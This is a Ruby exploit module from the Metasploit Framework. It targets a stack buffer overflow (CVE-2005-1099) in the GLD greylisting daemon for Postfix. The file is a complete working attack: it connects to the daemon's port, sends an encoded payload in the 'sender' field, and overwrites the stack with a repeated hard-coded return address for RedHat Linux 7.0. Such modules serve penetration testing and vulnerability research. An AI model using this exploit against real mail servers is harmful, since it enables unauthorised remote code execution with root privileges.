##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


	class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'GLD (Greylisting Daemon) Postfix Buffer Overflow',
			'Description'	=> %q{
				This module exploits a stack overflow in the Salim Gasmi
				GLD <= 1.4 greylisting daemon for Postfix. By sending an
				overly long string the stack can be overwritten.
			},
			'Version'	=> '$Revision$',
			'Author'	=> [ 'patrick' ],
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'linux',
			'References'	=>
				[
					[ 'CVE', '2005-1099' ],
					[ 'OSVDB', '15492' ],
					[ 'BID', '13129' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/934' ],
				],
			'Privileged'	=> true,
			'License'	=> MSF_LICENSE,
			'Payload'	=>
				{
					'Space' => 1000,
					'BadChars' => "\x00\x0a\x0d\x20=",
					'StackAdjustment' => -3500,
				},
			'Targets'	=>
				[
					[ 'RedHat Linux 7.0 (Guinness)', { 'Ret' => 0xbfffa5d8 } ],
				],
			'DefaultTarget'	=> 0
		))

		register_options(
			[
				Opt::RPORT(2525)
			],
			self.class
		)
	end
	
	def exploit
		connect

		sploit = "sender="+ payload.encoded + "\r\n"
		sploit << "client_address=" + [target['Ret']].pack('V') * 300 + "\r\n\r\n"

		sock.put(sploit)
		handler
		disconnect

	end

end
